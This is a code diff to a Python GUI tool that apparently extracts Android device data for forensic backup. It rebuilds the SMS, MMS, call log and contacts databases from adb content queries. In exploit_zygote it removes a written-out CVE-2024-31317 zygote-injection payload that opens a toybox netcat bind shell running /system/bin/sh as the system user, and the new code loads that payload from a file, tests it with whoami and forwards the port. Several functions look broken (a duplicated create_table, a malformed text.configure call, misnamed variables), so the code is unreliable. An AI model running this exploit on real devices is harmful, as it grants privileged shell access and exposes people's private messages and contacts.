@@ -651,6 +651,7 @@ class MyApp(ctk.CTk):
         self.wait_variable(self.change)
         folder = f'{snr}_prfs_{str(datetime.now().strftime("%Y_%m_%d_%H_%M_%S"))}'
         zip_path = f"{folder}.zip"
+        
         zip = zipfile.ZipFile(zip_path, "w", compression=zipfile.ZIP_DEFLATED, compresslevel=1)
         try: os.mkdir(folder)
         except: pass
@@ -689,10 +690,10 @@ class MyApp(ctk.CTk):
                 except: pass
             else:
                 pass
-
         zip.close()
         try: shutil.rmtree(folder)
         except: pass
+        # Exploiting attempt
         if int(software.split(".")[0]) in range(9,11):
             self.change.set(0)
             self.prog_text.configure(text="")
@@ -705,6 +706,17 @@ class MyApp(ctk.CTk):
             self.wait_variable(self.change)
         else:
             pass
+
+        # Database Recreation
+        self.change.set(0)
+        self.prog_text.configure(text="")
+        self.progress.pack_forget()
+        self.progress = ctk.CTkProgressBar(self.dynamic_frame, width=585, height=30, corner_radius=0, mode="indeterminate", indeterminate_speed=0.5)
+        self.progress.pack()
+        self.progress.start()
+        self.recreate_dbs = threading.Thread(target=lambda: recreate_dbs(change=self.change, text=self.text, zip_path=zip_path))
+        self.recreate_dbs.start()
+        self.wait_variable(self.change)
         self.text.configure(text="Data Extraction complete.")
         log(f"Created Backup: {zip_path}")
         self.prog_text.pack_forget()
@@ -1893,73 +1905,193 @@ def ut_app_shot():
     return img
 
 #Helper functions for DB Recreation
-def collect_columns(data):
-    if not data:
-        return []
-    columns = list(data[0].keys()) 
-    for row in data[1:]:
-        for key in row.keys():
-            if key not in columns:
-                columns.append(key)
-    return columns
+def create_table(cur, table_name, columns):
+    cols_sql = ", ".join([f'"{col}" TEXT' for col in columns])
+    cur.execute(f"CREATE TABLE IF NOT EXISTS {table_name} ({cols_sql})")
 
 def create_table(cur, name, columns):
     col_def = ", ".join([f'"{col}" TEXT' for col in columns])
     cur.execute(f"DROP TABLE IF EXISTS {name};")
     cur.execute(f"CREATE TABLE {name} ({col_def});")
 
-def insert_data(cur, name, columns, mandatory_columns, data):
+def insert_data(cur, table_name, schema_defaults, data_rows):
+    columns = list(schema_defaults.keys())
     placeholders = ", ".join(["?"] * len(columns))
-    sql = f"INSERT INTO {name} ({', '.join(columns)}) VALUES ({placeholders})"
-    for row in data:
-        values = [row.get(col) for col in columns]
+    sql = f"INSERT INTO {table_name} ({', '.join(columns)}) VALUES ({placeholders})"
+
+    for row in data_rows:
+        values = []
+        for col in columns:
+            if col in row:
+                values.append(row[col])
+            elif col in schema_defaults:
+                values.append(schema_defaults[col])
+            else:
+                values.append(None)
         cur.execute(sql, values)
 
 #Recreate Device Databases
-def recreate_dbs(change, text):
+def recreate_dbs(change, text, zip_path=None):
+  
+    #SMS/MMS
+    text.configure("Attempt to recreate the mmssms.db database.")
     mmssms_db = "mmssms.db"
-    sms_data = device.shell("content query --uri content://sms")
-    sms_json = content_to_json(sms_data) 
-    pdu_data = device.shell("content query --uri content://mms")
-    pdu_json = content_to_json(pdu_data)
-    addr_data = device.shell("content query --uri content://mms/addr")
-    addr_json = content_to_json(addr_data)
-    part_data = device.shell("content query --uri content://mms/part")
-    part_json = content_to_json(part_data)
-    mmssms_map = {"addr": addr_json, "part": part_json, "pdu": pdu_json, "sms": sms_json}
+    try: os.remove(mmssms_db)
+    except: pass
+    try:
+        sms_data = device.shell("content query --uri content://sms")
+        sms_json = content_to_json(sms_data) 
+    except:
+        sms_json = [{}]
+    try:
+        pdu_data = device.shell("content query --uri content://mms")
+        pdu_json = content_to_json(pdu_data)
+    except:
+        pdu_json = [{}]
+    try:
+        addr_data = device.shell("content query --uri content://mms/addr")
+        addr_json = content_to_json(addr_data)
+    except:
+        addr_json = [{}]
+    try:
+        part_data = device.shell("content query --uri content://mms/part")
+        part_json = content_to_json(part_data)
+    except:
+        part_data = [{}]
+
+    mmssms_schema = os.path.join(os.path.dirname(__file__), "ressources" , "mmssms.json")
+    with open(mmssms_schema, "r", encoding="utf-8") as f:
+        schema = json.load(f)
+    addr_defaults = schema["addr"]
+    part_defaults = schema["part"]
+    pdu_defaults = schema["pdu"]
+    sms_defaults = schema["sms"]
+    tables_map = {
+        "addr": (addr_defaults, addr_json),
+        "part": (part_defaults, part_json),
+        "pdu": (pdu_defaults, pdu_json),
+        "sms": (sms_defaults, sms_json)
+    }    
     conn = sqlite3.connect(mmssms_db)
     cur = conn.cursor()
-    total_rows = 0
-    mandatory_columns = {}
-    for name, data in mmssms_map.items():
-        columns = collect_columns(data)
-        create_table(cur, name, columns)
-        insert_data(cur, name, columns, mandatory_columns, data)
-        conn.commit()
-    conn.close()
-
-    call_db = "calllog.db"
-    call_data = device.shell("content query --uri content://call_log/calls")
-    call_json = content_to_json(call_data)
-    conn = sqlite3.connect(call_db)
-    cur = conn.cursor()
-    total_rows = 0
-    columns = collect_columns(call_json)
-    mandatory_columns = {
-        "_data": None,          
-        "mime_type": None,       
-        "transcription": None,   
-        "deleted": 0             
-    }       
-    for col in mandatory_columns:
-        if col not in columns:
-            columns.append(col)
-    create_table(cur, "calls", columns)
-    insert_data(cur, "calls", columns, mandatory_columns, call_json)
+    
+    for table_name, (table_defaults, table_data) in tables_map.items():
+        schema_columns = list(table_defaults.keys())
+        extra_columns = []
+        for row in table_data:
+            for key in row.keys():
+                if key not in schema_columns and key not in extra_columns:
+                    extra_columns.append(key)
+        columns = schema_columns + extra_columns
+        cur.execute(f"DROP TABLE IF EXISTS {table_name}")
+        create_table(cur, table_name, columns)
+        insert_data(cur, table_name, table_defaults, table_data)
     conn.commit()
     conn.close()
+    log("Recreated mmssms.db (partial)")
+    
+    #CallLog
+    text.configure("Attempt to recreate the calllog.db database.")
+    call_db = "calllog.db"
+    try: os.remove(call_db)
+    except: pass
+    try:
+        call_data = device.shell("content query --uri content://call_log/calls")
+        call_json = content_to_json(call_data)
+    except:
+        call_json = [{}]
+    call_schema = os.path.join(os.path.dirname(__file__), "ressources" , "calllog.json")
+    with open(call_schema, "r", encoding="utf-8") as f:
+        schema = json.load(f)
+    calls_defaults = schema["calls"]    
+    conn = sqlite3.connect(call_db)
+    cur = conn.cursor()
+    
+    schema_columns = list(calls_defaults.keys())
+    extra_columns = []
+    for row in call_json:
+        for key in row.keys():
+            if key not in schema_columns and key not in extra_columns:
+                extra_columns.append(key)
+    columns = schema_columns + extra_columns
+    create_table(cur, "calls", columns)
+    insert_data(cur, "calls", calls_defaults, call_json)
+    conn.commit()
+    conn.close()
+    log("Recreated calllog.db (partial)")
 
+    #CONTACTS
+    text.configure("Attempt to recreate the contacts2.db database.")
+    contact_db = "contacts2.db"
+    try: os.remove(contact_db)
+    except: pass
+    try:
+        contact_contacts = device.shell("content query --uri content://com.android.contacts/contacts")
+        contact_contacts_json = content_to_json(contact_contacts)
+    except:
+        contact_contacs_json = [{}]
+    try:
+        contact_data = device.shell("content query --uri content://com.android.contacts/data")
+        contact_data_json = content_to_json(contact_data)
+        unique_mimetypes = {}
+        next_id = 1
+        for entry in contact_data_json:
+            mime = entry.get("mimetype")
+            if mime is None:
+                continue  
+            if mime not in unique_mimetypes:
+                unique_mimetypes[mime] = next_id
+                next_id += 1
+            entry["mimetype_id"] = unique_mimetypes[mime]
+        mimetype_json = [{"_id": id_, "mimetype": mime} for mime, id_ in unique_mimetypes.items()]
+    except:
+        contact_data_json = [{}]
+        mimetype_json = [{}]
+    try:
+        contact_raw_contacts_data = device.shell("content query --uri content://com.android.contacts/raw_contacts")
+        contact_raw_contacts_json = content_to_json(contact_raw_contacts_data)
+    except:
+        contact_raw_contacts_json = [{}]
+    try:
+        contact_settings_data = device.shell("content query --uri content://com.android.contacts/settings")
+        contact_settings_json = content_to_json(contact_settings_data)
+    except:
+        contact_settings_json = [{}]
+    contact_schema = os.path.join(os.path.dirname(__file__), "ressources" , "contacts2.json")
+    with open(contact_schema, "r", encoding="utf-8") as f:
+        schema = json.load(f)
+    contacts_defaults = schema["contacts"]
+    data_defaults = schema["data"]
+    mimetype_defaults = schema["mimetypes"]
+    raw_contacts_defaults = schema["raw_contacts"]
+    tables_map = {
+        "contacts": (contacts_defaults, contact_contacts_json),
+        "data": (data_defaults, contact_data_json),
+        "mimetypes": (mimetype_defaults, mimetype_json),
+        "raw_contacts": (raw_contacts_defaults, contact_raw_contacts_json)
+    }    
+    conn = sqlite3.connect(contact_db)
+    cur = conn.cursor()
+    
+    for table_name, (table_defaults, table_data) in tables_map.items():
+        schema_columns = list(table_defaults.keys())
+        columns = schema_columns
+        cur.execute(f"DROP TABLE IF EXISTS {table_name}")
+        create_table(cur, table_name, columns)
+        insert_data(cur, table_name, table_defaults, table_data)
+    conn.commit()
+    conn.close()
+    log("Recreated contacts2.db (partial)")
 
+    if zip_path != None:
+        with zipfile.ZipFile(zip_path, mode="a") as zf:
+            if os.path.exists(mmssms_db):
+                zf.write(mmssms_db, "data/data/com.android.providers.telephony/databases/mmssms.db")
+            if os.path.exists(call_db):
+                zf.write(call_db, "data/data/com.android.providers.contacts/databases/calllog.db")
+            if os.path.exists(contact_db):
+                zf.write(contact_db, "data/data/com.android.providers.contacts/databases/contacts2.db")
+    change.set(1)
     
 
 def get_data_size(data_path, change):
@@ -2129,26 +2261,15 @@ def exploit_zygote(zip_path, text, prog_text, change):
                 break
         return b"".join(chunks).decode("utf-8", errors="ignore")
 
-    device.shell('''settings put global hidden_api_blacklist_exemptions "LClass1;->method1(
-    10
-    --runtime-args
-    --setuid=1000
-    --setgid=1000
-    --runtime-flags=2049
-    --mount-external-full
-    --setgroups=3003
-    --nice-name=runnetcat
-    --seinfo=platform:targetSdkVersion=28:complete
-    --invoke-with
-    toybox nc -s 127.0.0.1 -p 4321 -L /system/bin/sh -l;
-    "
-    settings delete global hidden_api_blacklist_exemptions
-    sleep 2
-    ''')
+    cve_file = os.path.join(os.path.dirname(__file__), "ressources" , "cve", "2024_31317.txt")
+    with open(cve_file,"r") as f:
+        cve_cmd = f.read()
+    try: device.shell(cve_cmd, timeout=4)
+    except: pass
     cmd = '''sh -c \"echo 'whoami' | toybox nc localhost 4321\"'''
-    whoami = device.shell(cmd)
-    #print(whoami)
-    if "system" in whoami:
+    z_whoami = device.shell(cmd)
+    #print(z_whoami)
+    if "system" in z_whoami:
         log("Device is vulnerable to CVE-2024–31317")
         device.forward("tcp:4321", "tcp:4321")
         host = "localhost"
